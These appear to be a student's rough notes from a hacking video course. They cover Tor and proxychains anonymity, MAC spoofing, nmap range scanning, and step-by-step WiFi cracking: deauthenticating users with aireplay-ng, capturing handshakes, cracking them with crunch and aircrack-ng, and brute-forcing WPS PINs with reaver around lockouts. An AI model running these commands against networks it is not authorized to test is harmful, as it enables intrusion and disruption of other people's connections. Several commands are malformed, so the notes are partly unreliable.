open Tor
search hiddenwiki Url since its url changes automatically
proxies- Yor search qeuries are tunneled through various servers so the the main eg. facebook server gets request from some other server instead of ours this is slow

type of proxies HTTP, SOCKS4,SOCKS5(best)
nano/etc/proxychains.conf is teh config page for proxies
just delet the # in the proxy type	
most importantly Proxy dns is needed 3:29:50 video
tor by default 9050 port

to start end and find status of a services
$ service tor status
$ service tor start
after starting tor service check connections its should always be done for anonymity during footprinting etc
eg 
$ proxychains firefox www.flipkart.com
after using this check for dns leaks online
for proxies use location of china or russia but netherlands is best privacy policies
stick with 2 or 3 proxies or else it will take a lot of time to browse though all the proxies listed in proxychains.conf

vpn connection
if network not managed mode
then do nano /etc/NetworkManager/NetworkManager.conf   and set managed=true  and then restart network manager
service network-manager restart
install vpn from apt-get at 4:00:40
add vpns 
or search vpns at vpnbook.com
download from site and extract irt to windows then 
go to that directory by cd command
then type
# openvpn --config {vpnbook-de23-tcp443.vpn}(this is the name of vpn) 
after enter it will ask fror username and password which is given in the site
this will configure the vpn now check for dns leaks
goto $ nano /etc/resolv.conf
npw it will show home router ip addr.
now we have to comment it using #
since the dns request are forwarded to this addr
go to opendns and get a new dns addr and paste it to the resolv.conf
add atleast 2 opendns so that if one fails other maintains ur connections

don not restart ur network manager as it will take back the original nameserver
mac addr the 1st 3 addr are used to identify mfg of the device if we kmnow the ,mfg of the device we know the vulnerability
use macchanger to change ur mac
use a script so that evrytime v boot it will changre to a random macaddr
when we wnat stuffs to be automated in linux we use cronjob

# crontab --help
$ crontab -e
 then edit 
 @reboot macchanger -r eth0
 
 ---foot printing
 nmap
 or zenmap(graphical nmap)44
go to nmap site to test their site using nmap nmap.org
nmap raise a lot of alarm in sense it is flagged by the firewall so to make the nmap as silent as possible

mostly is nmap -v used  verbose output
-o is used for os detecction 
-iL<input file list>
major ip blocks search on google n go to nirsoft it has range of all ip address
once after getting an ip address search engine is the best help 
using whois
innmap -v is used because once we start nmapping we wont get op screen is blank so tpo get step by step detail we use -v
now after scanning the port we see some port open closed filtered
   open means servoce is running we can do an attack closed means cant do anythin
   filtered means there is some firewall activites going thru that port not much info hav to learn

   to find the local subnet ip address go to ifconfig check the inet address and at the last ocket change the range from 0 to 255
   now scanning a range of ip an having a grepable output into  file




nmap -oG -192.168.0.0-255(inet range) -p 22 (we are giving teh port num cos it will take huge time to check all the 1000 port)-vv > /home/result.txt
now after getting op in file and using grep we get many required data an from that data to extract ip addr we use awk
cat
cat result.txt | grep Up awk -F " " '{print $2}' > result2
 (video 10:41:52 )

nmap -iL result2 -vv
tool to assing an ip address to a real address
curl ipinfo/io/74.207.244.221 (vid 10:38:02)
in nmap site the provide scripts for different attack we can do using nmap  scanme.nmap.org

--nslookup 
can get ip addr using this
dns port num is 53
nslookup also works in reverse we can give ip address also

--exploitdb on google give all vlnerability

--wireless crack

always better to find ip of router and attack it rather than wpa2 crack
in exploitdb search for vulnrability in home router

aircrak ng suite and reaver is used to crack wifi
cracking wifi or router having pin authentication is very easy so disable it

premiscus mode-network card only process data related to that computer
but it is encrypted
monitor mode-take all traffic and process it forfurther info mac in not encrypted but most info is encrypt
 in frdora no reaver in repository 
 instead download it on internet

eg reaver

reaver -i mon0(network interface) -b 00:44:....(mac id) -vv


aircrack suite has airdump ng which is used to collect info

a;lso download crunch which is a password listing tool :9:57:25


crunch <min> <max> [strings] [optoon]

eg yo use crunch and aircrack

crunch 5 8 abcdef12345 | aircrack-ng -w -

-w is for password list


 
 set wifi to monitor mode
steps 
1 ifconfig wlan0 down
2 iwconfig wlan0 mode monitor
3 ifconfig wlan0 up

now check for some process which troubles function of  networf
always kill NetworkManager 1st 
next kill dhclient 
then kill the rest of them
 airmon-ng check wlan0
 kill 1122(the num next to it)

 now do a scan of surrounding of all the networks around us

 airodump-ng wlan0
 gives list
 pwr is teh strength of signal -15 is lot better than -30
upper list is the router
lower list is the ip or user connected to the bssid of router
  deauth attack

now copy bssid of targer roter and perform command
airodump-ng -c 6 (channe num.) -w test_file(output filesname) --bssid (mac id or router) wlan0

now we get another window of the person connected to it
station is the bssid of the connected person


aireplay is for deauth purpose

aireplay-ng -0 9 -a (mac addr of router)  wlan0 
(-0 is for  number of deauth transmission to send and 0  means infinity loop) all this should be run on new terminal

so basically it deauth the connected device and after stopping the deauth the target again reconnect to wifi and when this happen we can capture the handshake

after capturing stop the airodump


no cracking using crunch an aircrack

before cracking use man cruncg to use a wordfile with certain characters and certain combinations 
crunch -t
here @ insert lowercase
, insert uppercase
%insert number
^ insert symbols


eg crunch 8 8-t %%%%abcd(should be equal to the num specified)  1234 | aircrack-ng -w - test_file.cap(the once used to store handshake) -e (essid)

the .cap file can be portable that is take it to other pc and divide the work


pin auth enabled by default crack remote ut downside is that after certain attempts router locks and wont accept pins  



after killing network manager we can start it using
service NetworkManager restart


wash -i wlan0 if this command shows error mke a dir
mkdir /etc/reaver if olready there dont do it
it tells us about vulnerability of pin auth i.e wps locked or not
if wps locked is no
then it is vulnerable else dont try
reaver -b (macaddr of router) -i wlan0 -c (channel from airodump) -vv
then it will ask restore from prev session if yes
 then after certain tries if it get locked then after some more time it will continue from where it was left


mdk3 maybe reset router if the wps is locked

if the tries get you locked then deauth the users so that they can reset the router  and we can again try our reaver

we can limit no. of tries for certain time

reaver -b (macaddr of router) -i wlan0 -c (channel from airodump) -r 2:60 (that means 2 tries in 60 sec) -vv


another way to rack password is that all companies make password using algo so rev engg that algo using net and we get it
tp link has they password related to 1st part of mac addr
